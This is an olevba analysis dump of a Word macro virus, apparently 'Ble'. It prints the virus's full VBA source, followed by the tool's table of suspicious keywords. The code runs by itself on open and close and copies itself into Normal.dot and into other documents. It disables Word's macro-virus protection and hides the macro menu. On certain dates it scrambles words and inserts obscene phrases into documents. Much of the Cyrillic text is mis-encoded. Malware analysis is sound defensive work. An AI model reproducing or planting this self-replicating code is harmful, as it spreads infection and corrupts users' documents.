olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ble-76e630e187e8befd67761ee0191704478b9ae0a4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ble-76e630e187e8befd67761ee0191704478b9ae0a4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MacroBle.bas 
in file: Virus.MSWord.Ble-76e630e187e8befd67761ee0191704478b9ae0a4 - OLE stream: 'Macros/VBA/MacroBle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public myname$
Public Changed As Boolean
Public sz As Long
Public k As Long
Public NoSpecial As Boolean
Option Base 1
Dim ends$(2, 12)
Dim Moora1$(40)
Dim Moora2$(10)
Dim Bls$(3)



Sub AutoOpen()
Attribute AutoOpen.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoOpen"
 On Error GoTo 1
 myname$ = "MacroBle"
 WordBasic.DisableAutoMacros 0
 
 If Not CheckNormal Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
  Set mytemp = NormalTemplate.OpenAsDocument
  mytemp.SaveAs (GetPath$ + "NORMAL1.DOT")
  mytemp.Close SaveChanges:=wdSaveChanges
End If
GoTo 2
1:
 'MsgBox "Fuck up !"
 Resume 2
2:
 RunOtherMacro MacN:="AutoOpen"
End Sub
Function CheckNormal()
 cn = False
 For Each x In NormalTemplate.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckNormal = cn
End Function
Sub RunOtherMacro(MacN As String)
 On Error GoTo Run_Error
 For Each Mac In ActiveDocument.VBProject.VBComponents
   If (Mac.Type = 1) And (Mac.Name <> "MacroBle") Then
    Application.Run "project." + Mac.Name + "." + MacN
Skip_Error:
   End If
  Next Mac
 GoTo End_Run
Run_Error:
 Resume Skip_Error
End_Run:

End Sub

Function CheckActive()
 cn = False
 For Each x In ActiveDocument.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckActive = cn
 End Function

Sub AutoClose()
Attribute AutoClose.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoClose"
 On Error GoTo errorlevel2
 If Not CheckActive Then Application.OrganizerCopy Source:=GetPath$ + "NORMAL1.DOT", Destination:=ActiveDocument.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
 If MyDate Then Optimize
 GoTo end_f
errorlevel2:
 'MsgBox "More Errors !"
 Resume end_f
end_f:
 RunOtherMacro MacN:="AutoClose"
End Sub

Function GetPath$()
 s$ = NormalTemplate.FullName
 s$ = Mid$(s$, 1, Len(s$) - 10)
 GetPath$ = s$
End Function

Sub AutoExec()
Attribute AutoExec.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.AutoExec"
 Options.VirusProtection = False
 Set x = CommandBars("Tools").Controls(12)
 x.Visible = False
 x.Enabled = False
 ends$(1, 1) = "��"
 ends$(1, 2) = "鍏�""
 ends$(1, 3) = "鍎�""
 ends$(1, 4) = "��"
 ends$(1, 5) = "鍎"
 ends$(1, 6) = "��"
 ends$(1, 7) = "鍣"
 ends$(1, 8) = "嚲"
 ends$(1, 9) = "��"
 ends$(1, 10) = "��"
 ends$(1, 11) = "�擯""
 ends$(1, 12) = "鍷"
 ends$(2, 1) = "鴇"
 ends$(2, 2) = "樍�""
 ends$(2, 3) = "樦�""
 ends$(2, 4) = "鳻"
 ends$(2, 5) = "樦"
 ends$(2, 6) = "樥"
 ends$(2, 7) = "鳺"
 ends$(2, 8) = "儓"
 ends$(2, 9) = "鳻"
 ends$(2, 10) = "鳻�""
 ends$(2, 11) = "槫"
 ends$(2, 12) = "��"
 
 Moora1$(1) = "蘦槻"
 Moora1$(2) = "槦鳧麔"
 Moora1$(3) = "蜦膻�""
 Moora1$(4) = "麧摜錪�""
 Moora1$(5) = "檍魡籦"
 Moora1$(6) = "臝樇鍒"
 Moora1$(7) = "劌搿�""
 Moora1$(8) = "勷瀇魤"
 Moora1$(9) = "膰���""
 Moora1$(10) = "鶋錌儋籦"
 
 Moora1$(11) = "櫇僽鳹��"
 Moora1$(12) = "蜦碴��""
 Moora1$(13) = "膰賨鴈"
 Moora1$(14) = "槦錒�""
 Moora1$(15) = "槦鳧"
 Moora1$(16) = "歞諙鳧麔"
 Moora1$(17) = "瀔鳼鶇霟�""
 Moora1$(18) = "麠諘薃�""
 Moora1$(19) = "蝂鵨�""
 Moora1$(20) = "嚦謥擨"
 
 Moora1$(21) = "蝂鵨飶"
 Moora1$(22) = "覷瀁蹖�""
 Moora1$(23) = "罻縺錒諘灕鍙�""
 Moora1$(24) = "睯誽錒�""
 Moora1$(25) = "儴樖霟僦"
 Moora1$(26) = "瀔�╠�"
 Moora1$(27) = "謼闅�""
 Moora1$(28) = "齕鋋籦"
 Moora1$(29) = "鶇鍱錒�""
 Moora1$(30) = "搿豂魡碭籦"
 
 Moora1$(31) = "鍕嚦賾矐臇"
 Moora1$(32) = "翴膼謽鳪��"
 Moora1$(33) = "瀇�蜬�"
 Moora1$(34) = "膰��籦"
 Moora1$(35) = ""
 Moora1$(36) = ""
 Moora1$(37) = ""
 Moora1$(38) = ""
 Moora1$(39) = ""
 Moora1$(40) = ""

 Moora2$(1) = "鼀鴈��""
 Moora2$(2) = "隰鵴禘"
 Moora2$(3) = "碭薞�""
 Moora2$(4) = "隰鵴瘔��"
 Moora2$(5) = ""
 Moora2$(6) = ""
 Moora2$(7) = ""
 Moora2$(8) = ""
 Moora2$(9) = ""
 Moora2$(10) = ""
 
 Bls$(1) = "摠�"
 Bls$(2) = "� 縺覷謥"
 Bls$(3) = "蠋鞜 憵譔"
 
End Sub

Sub Optimize()
Attribute Optimize.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute Optimize.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.MakeSoviet"
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "倬�" Then
  sz = ActiveDocument.Words.Count
  Changed = False
  Optima = 0
  If sz <= 500 Then
   For k = 1 To sz
    tss$ = ActiveDocument.Words.Item(k)
    Application.StatusBar = "砐鳲闅鍒罻 � 勷臝鳧樇噮: " + Str$(k \ 5) + "%"
    If Len(tss$) > 4 Then GoSub Do_Trunslate
   Next k
  Else
   li = 1
   While li < 100
    k = Int(sz * Rnd + 1)
    tss$ = ActiveDocument.Words.Item(k)
    If Len(tss$) > 4 Then
     GoSub Do_Trunslate
     li = li + 1
     Application.StatusBar = "砐鳲闅鍒罻 � 勷臝鳧樇噮: " + Str$(li) + "%"
    End If
   Wend
  End If
  Application.StatusBar = "砐鳲闅鍒罻 諘瞂蹢樇�. 昜蠂擯諘灕�: " + Str$(Optima) + "%"
 End If
  GoTo end_proc
  
Do_Trunslate:
   tss$ = TrunslateWord(tss$)
   If Changed Then
    ActiveDocument.Words(k) = tss$
    Changed = False
    Optima = Optima + 1
   End If
  Return
end_proc:
End Sub

Function TrunslateWord$(ts As String)
 tw$ = ts
 spaces = CheckSpace(ts)
 If spaces <> 0 Then ts = Mid$(ts, 1, Len(ts) - spaces)
 Lts = Len(ts)
 If Lts > 4 Then
  If CheckAdjective(ts) Then
   c = 1
   While c <= 2
    i = 1
    While i <= 12
     CEnd$ = ends$(c, i)
     MyEnd$ = Mid$(ts, Lts - Len(CEnd$) + 1, Len(CEnd$))
     If MyEnd$ = CEnd$ Then
      Changed = True
      Select Case c
       Case 1
        tw$ = Moora1$(Int(34 * Rnd + 1)) + CEnd$
       Case 2
        tw$ = Moora2$(Int(3 * Rnd + 1)) + CEnd$
      End Select
      If spaces <> 0 Then tw$ = tw$ + Space(spaces)
      FLett = Mid$(ts, 1, 1)
      If UCase$(FLett) = FLett Then tw$ = UCase$(Mid$(tw$, 1, 1)) + Mid$(tw$, 2, Len(tw$) - 1)
      i = 12
      c = 2
     End If
     i = i + 1
    Wend
    c = c + 1
   Wend
  End If
 End If
 TrunslateWord$ = tw$
End Function

Function CheckSpace(csp As String) As Integer
 spp = 0
 n = Len(csp)
 If n > 3 Then
  While (Mid$(csp, n, 1) = " ") And (n > 3)
   n = n - 1
   spp = spp + 1
  Wend
 End If
 CheckSpace = spp
End Function


Function MyDate() As Boolean
 dt$ = Date$
 If InStr(1, dt$, "15") <> 0 Then MyDate = True Else MyDate = False
End Function


Function CheckAdjective(adj As String) As Boolean
 cadj = False
 NoSpecial = True
 atj$ = LCase$(Mid$(adj, 1, 5))
 Select Case atj$
  Case "樉槼�""
   NoSpecial = False
  Case "馯黽�""
   NoSpecial = False
  Case "鶇鍒�""
   NoSpecial = False
  Case "縺鼨�""
   NoSpecial = False
 End Select
 If NoFuckenError(atj$) Then
  Set mySynInfo = SynonymInfo(adj)
  myPos = mySynInfo.PartOfSpeechList
  i = UBound(myPos)
  If i >= 1 Then If myPos(1) = wdAdjective Then cadj = True
 Imp
 CheckAdjective = cadj
End Function

Function NoFuckenError(wrd As String) As Boolean
 atj = Mid$(wrd, 1, 1)
 Select Case atj
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
  Case "�""
   NoSpecial = False
End Select
 NoFuckenError = NoSpecial
End Function

Sub FileSave()
Attribute FileSave.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute FileSave.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.FileSave"
 RunOtherMacro MacN:="FileSave"
 On Error GoTo Save_err
 AutoClose
 ActiveDocument.Save
Save_err:
End Sub

Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.FileSaveAs"
 RunOtherMacro MacN:="FleSaveAs"
 On Error GoTo SaveAs_err
 AutoClose
 Dialogs(wdDialogFileSaveAs).Show
SaveAs_err:
End Sub

Sub FilePrint()
Attribute FilePrint.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute FilePrint.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.FilePrint"
    If MyDate Then
     MakeInsert
     sc = Selection.Sentences.Count
     If sc < 2 Then
      ActiveDocument.Words.Last.InsertAfter (" 鎚�, 珂Ь纖 ! (end of document)")
     Else
      Selection.Words.Last.InsertBefore (" 扰鍎� 襜蜦, 劌憵� 瘔� 縺儋 瀁澽� 縺 蘦�!")
     End If
    End If
    Dialogs(wdDialogFilePrint).Show
   End Sub

Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.ToolsMacro"
 Beep
Rem  Dialogs(wdDialogToolsMacro).Show
End Sub

Sub MakeInsert()
Attribute MakeInsert.VB_Description = "10.04.97 (c) Microsoft Corporation"
Attribute MakeInsert.VB_ProcData.VB_Invoke_Func = "Project.MacroBle.MakeInsert"
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "倬�" Then
  sz = ActiveDocument.Words.Count
  If sz > 500 Then
   For i = 1 To 50
    Application.StatusBar = "砐鳲闅鍒罻: " + Str$(i * 2)
    k = Int((sz - 1) * Rnd + 1)
    tss$ = RTrim(ActiveDocument.Words(k))
    If Len(tss$) > 4 Then
     tss1$ = RTrim(ActiveDocument.Words(k + 1))
     If Len(tss1$) > 4 Then
     If Int(3 * Rnd + 1) = 1 Then
      blya$ = ", " + Bls$(Int(3 * Rnd + 1)) + ", "
      ActiveDocument.Words(k).InsertAfter (blya$)
     End If
     End If
    End If
   Next i
   Application.StatusBar = "鏝襜碭."
  End If
 End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

